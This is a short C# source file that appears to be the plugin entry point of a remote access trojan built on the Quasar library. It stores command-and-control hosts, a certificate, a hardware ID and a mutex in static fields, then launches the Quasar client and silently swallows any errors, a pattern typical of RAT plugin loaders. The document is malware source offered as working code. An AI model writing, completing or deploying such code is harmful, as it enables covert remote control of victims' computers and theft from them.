using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace Plugin
{
    public class Plugin
    {
        public static string HOSTS;
        public static byte[] Mutex;
        public static System.Security.Cryptography.X509Certificates.X509Certificate2 CERTIFICATE;
        public static string Hwid;
        public static string InstallFile;

        public void Run(string Hosts, System.Security.Cryptography.X509Certificates.X509Certificate2 certificate, string hwid, byte[] msgPack, string mtx)
        {

            Mutex = msgPack;
            CERTIFICATE = certificate;
            Hwid = hwid;
            HOSTS = Hosts;

            try
            {

                new QuasarApplication().Run();
            }
            catch (Exception ex)
            {

            }
        }
    }
}
